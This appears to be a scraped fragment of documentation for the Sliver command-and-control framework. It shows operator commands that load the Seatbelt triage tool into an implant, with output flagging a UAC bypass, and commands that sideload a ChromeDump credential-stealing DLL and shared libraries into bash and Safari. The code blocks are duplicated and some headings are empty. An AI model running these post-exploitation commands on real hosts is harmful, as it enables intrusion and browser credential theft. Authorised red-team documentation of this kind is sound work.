## Sideloading Features
## Known Limitations
## Loading .NET Assemblies
Here's an example with [Seatbelt](https://github.com/GhostPack/Seatbelt):
```
sliver (CONCRETE_STEEL) > execute-assembly -t 80 /tmp/Seatbelt.exe All
[*] Assembly output:

                        %&&@@@&&
                        &&&&&&&%%%,                       #&&@@@@@@%%%%%%###############%
                        &%&   %&%%                        &////(((&%%%%%#%################//((((###%%%%%%%%%%%%%%%
%%%%%%%%%%%######%%%#%%####%  &%%**#                      @////(((&%%%%%%######################(((((((((((((((((((
#%#%%%%%%%#######%#%%#######  %&%,,,,,,,,,,,,,,,,         @////(((&%%%%%#%#####################(((((((((((((((((((
#%#%%%%%%#####%%#%#%%#######  %%%,,,,,,  ,,.   ,,         @////(((&%%%%%%%######################(#(((#(#((((((((((
#####%%%####################  &%%......  ...   ..         @////(((&%%%%%%%###############%######((#(#(####((((((((
#######%##########%#########  %%%......  ...   ..         @////(((&%%%%%#########################(#(#######((#####
###%##%%####################  &%%...............          @////(((&%%%%%%%%##############%#######(#########((#####
#####%######################  %%%..                       @////(((&%%%%%%%################
                        &%&   %%%%%      Seatbelt         %////(((&%%%%%%%%#############*
                        &%%&&&%%%%%        v0.2.0         ,(((&%%%%%%%%%%%%%%%%%,
                         #%%%%##,

=== Running System Triage Checks ===

=== Basic OS Information ===

  Hostname                      :  DESKTOP-0QQJ4JL
  Domain Name                   :
  Username                      :  DESKTOP-0QQJ4JL\lab
  ProductName                   :  Windows 10 Pro
  EditionID                     :  Professional
  ReleaseId                     :  1909
  BuildBranch                   :  19h1_release
  CurrentMajorVersionNumber     :  10
  CurrentVersion                :  6.3
  Architecture                  :  AMD64
  ProcessorCount                :  2
  IsVirtualMachine              :  True
  BootTime (approx)             :  5/19/2020 8:55:55 AM
  HighIntegrity                 :  False
  IsLocalAdmin                  :  True
    [*] In medium integrity but user is a local administrator- UAC can be bypassed.
...
```

## Shared Library Side Loading
Here's a starting point :
```
// Windows example
sliver (CONCRETE_STEEL) > sideload -e ChromeDump /tmp/chrome-dump.dll
// Linux example
sliver (CONCRETE_STEEL) > sideload -p /bin/bash -a "My arguments" /tmp/mylib.so
// MacOS example
sliver (CONCRETE_STEEL) > sideload -p /Applications/Safari.app/Contents/MacOS/SafariForWebKitDevelopment -a 'Hello World' /tmp/mylib.dylib
```

`
sliver (CONCRETE_STEEL) > execute-assembly -t 80 /tmp/Seatbelt.exe All
[*] Assembly output:

                        %&&@@@&&
                        &&&&&&&%%%,                       #&&@@@@@@%%%%%%###############%
                        &%&   %&%%                        &////(((&%%%%%#%################//((((###%%%%%%%%%%%%%%%
%%%%%%%%%%%######%%%#%%####%  &%%**#                      @////(((&%%%%%%######################(((((((((((((((((((
#%#%%%%%%%#######%#%%#######  %&%,,,,,,,,,,,,,,,,         @////(((&%%%%%#%#####################(((((((((((((((((((
#%#%%%%%%#####%%#%#%%#######  %%%,,,,,,  ,,.   ,,         @////(((&%%%%%%%######################(#(((#(#((((((((((
#####%%%####################  &%%......  ...   ..         @////(((&%%%%%%%###############%######((#(#(####((((((((
#######%##########%#########  %%%......  ...   ..         @////(((&%%%%%#########################(#(#######((#####
###%##%%####################  &%%...............          @////(((&%%%%%%%%##############%#######(#########((#####
#####%######################  %%%..                       @////(((&%%%%%%%################
                        &%&   %%%%%      Seatbelt         %////(((&%%%%%%%%#############*
                        &%%&&&%%%%%        v0.2.0         ,(((&%%%%%%%%%%%%%%%%%,
                         #%%%%##,

=== Running System Triage Checks ===

=== Basic OS Information ===

  Hostname                      :  DESKTOP-0QQJ4JL
  Domain Name                   :
  Username                      :  DESKTOP-0QQJ4JL\lab
  ProductName                   :  Windows 10 Pro
  EditionID                     :  Professional
  ReleaseId                     :  1909
  BuildBranch                   :  19h1_release
  CurrentMajorVersionNumber     :  10
  CurrentVersion                :  6.3
  Architecture                  :  AMD64
  ProcessorCount                :  2
  IsVirtualMachine              :  True
  BootTime (approx)             :  5/19/2020 8:55:55 AM
  HighIntegrity                 :  False
  IsLocalAdmin                  :  True
    [*] In medium integrity but user is a local administrator- UAC can be bypassed.
...
`

`
// Windows example
sliver (CONCRETE_STEEL) > sideload -e ChromeDump /tmp/chrome-dump.dll
// Linux example
sliver (CONCRETE_STEEL) > sideload -p /bin/bash -a "My arguments" /tmp/mylib.so
// MacOS example
sliver (CONCRETE_STEEL) > sideload -p /Applications/Safari.app/Contents/MacOS/SafariForWebKitDevelopment -a 'Hello World' /tmp/mylib.dylib
`

